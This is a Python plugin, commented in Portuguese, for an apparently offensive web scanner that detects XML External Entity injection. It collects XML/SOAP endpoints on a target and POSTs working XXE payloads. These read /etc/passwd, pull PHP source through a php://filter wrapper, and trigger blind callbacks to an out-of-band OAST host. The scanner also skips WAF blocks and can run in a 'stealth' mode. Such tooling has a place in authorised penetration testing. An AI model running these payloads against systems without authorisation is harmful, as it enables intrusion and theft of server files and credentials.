#!/usr/bin/env python3
"""
XXE (V10 Pro) — XML External Entity Injection detection.
Detecta endpoints XML, SOAP e testa payloads stealth (Error-based + Blind OAST).
"""
import json
import time
import httpx
from pathlib import Path
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

def _build_payloads(oast_url: str | None = None, deep: bool = False):
    payloads = []

    # 1. Classic File Read (Local)
    payloads.append({
        "name": "Classic XXE (file read)",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "detect": lambda body: any(x in body.lower() for x in ["root:x:", "localhost", "daemon:", "/bin/bash"]),
    })

    # 2. Error-based XXE (Stealthier)
    payloads.append({
        "name": "Error-based XXE (invalid file)",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_file_allma_v10">]><foo>&xxe;</foo>',
        "detect": lambda body: any(x in body.lower() for x in ["no such file", "failed to open", "error", "exception", "ioexception"]),
    })

    # 3. Blind XXE via OAST (Final Confirmation)
    if oast_url:
        payloads.append({
            "name": "Blind XXE via OAST",
            "body": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oast_url}/xxe_blind">%xxe;]><foo>test</foo>',
            "detect": lambda body: False,  # Detectado out-of-band via Interactsh
        })

    if deep:
        # Payloads adicionais para modo profundo
        payloads.append({
            "name": "XXE via PHP Wrapper",
            "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
            "detect": lambda body: len(body) > 20 and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in body.strip()[:20]),
        })

    return payloads


def _test_xxe(url: str, oast_url: str | None, deep: bool = False) -> list:
    """Testa payloads XXE em um endpoint (XML e SOAP)."""
    findings = []
    payloads = _build_payloads(oast_url, deep)
    
    content_types = ["application/xml", "text/xml", "application/soap+xml"]

    for ct in content_types:
        for payload_cfg in payloads:
            time.sleep(REQUEST_DELAY)
            try:
                with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
                    # Enviar POST com o payload
                    resp = client.post(url, content=payload_cfg["body"], headers={
                        "User-Agent": DEFAULT_USER_AGENT,
                        "Content-Type": ct,
                    })

                    # FILTRO V10: Ignorar 403, 405, 429 e Cloudflare blocks
                    # Muitos WAFs bloqueiam /etc/passwd ou DTDs com 403. Reportar isso é Falso Positivo.
                    is_cloudflare = "cloudflare" in resp.text.lower() or "cf-ray" in resp.headers
                    if resp.status_code in [403, 405, 429] or is_cloudflare:
                        continue

                    detected = payload_cfg["detect"](resp.text)

                    # EXIGÊNCIA V10: CRITICAL apenas se detected for True (achado real no body)
                    # OAST callback é tratado separadamente pelo report.
                    if detected:
                        findings.append({
                            "url": url,
                            "content_type": ct,
                            "payload_name": payload_cfg["name"],
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "type": "XXE",
                            "detected": True,
                            "details": f"XXE CONFIRMADO ({payload_cfg['name']}) via {ct}: Vazamento de dados detectado no response!",
                            "request_raw": format_http_request(resp.request),
                            "response_raw": format_http_response(resp),
                        })
                        return findings # Achou um crítico, para neste endpoint
            except Exception:
                pass

    return findings


def run(context: dict):
    target = context.get("target")
    deep = context.get("deep", False)
    stealth = context.get("stealth", False)
    
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟪───────────────────────────────────────────────────────────🟪\n"
        f"   📄 {C.BOLD}{C.CYAN}XXE (XML EXTERNAL ENTITY) SCANNER (V10 PRO){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END} | SOAP: Ativado | Stealth: {stealth}\n"
        f"🟪───────────────────────────────────────────────────────────🟪\n"
    )

    outdir = ensure_outdir(target, "xxe")

    # Ler OAST payload
    oast_file = Path("output") / target / "oast_payload.txt"
    oast_url = None
    if oast_file.exists():
        oast_url = oast_file.read_text().strip()
        if oast_url:
            info(f"   🔗 OAST OOB ATIVO: {C.YELLOW}{oast_url}{C.END}")

    # Coletar URLs candidatas
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    endpoint_file = Path("output") / target / "endpoint" / "endpoints.txt"

    all_urls = set()
    for f in [urls_file, endpoint_file]:
        if f.exists():
            all_urls.update(l.strip() for l in f.read_text(errors="ignore").splitlines() if l.strip())

    # Heurística de endpoints XML/SOAP
    xml_hints = ["api", "xml", "soap", "wsdl", "feed", "rss", "import", "upload", "parse", "webhook"]
    candidates = []
    for url in all_urls:
        path = urlparse(url).path.lower()
        if any(h in path for h in xml_hints):
            candidates.append(url)

    # Base URLs
    for scheme in ["https", "http"]:
        candidates.append(f"{scheme}://{target}/api")

    candidates = list(set(candidates))[:50]
    
    # Modo Stealth / Deep workers
    max_workers = 3 if stealth else 8
    info(f"   📋 Testando {len(candidates)} endpoints candidatos (Filtro Cloudflare/WAF Ativo)")

    results = []
    tests_run = 0

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_test_xxe, url, oast_url, deep): url for url in candidates}

        for future in as_completed(futures):
            tests_run += 1
            try:
                findings = future.result()
                if findings:
                    results.extend(findings)
                    for f in findings:
                        info(f"   🔴 {C.RED}[CRITICAL]{C.END} {f['url']} — {f['payload_name']}")
            except Exception:
                pass

    output_file = outdir / "xxe_results.json"
    output_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))

    summary = {"tests_run": tests_run, "endpoints_checked": len(candidates), "findings": len(results), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))

    if results:
        success(f"\n   📄 🔴 {len(results)} XXE Confirmado(s) com sucesso!")
    else:
        info(f"   ✅ 0 XXE detectado em {len(candidates)} endpoints.")

    success(f"   📂 Resultados salvos em {output_file}")
    return results
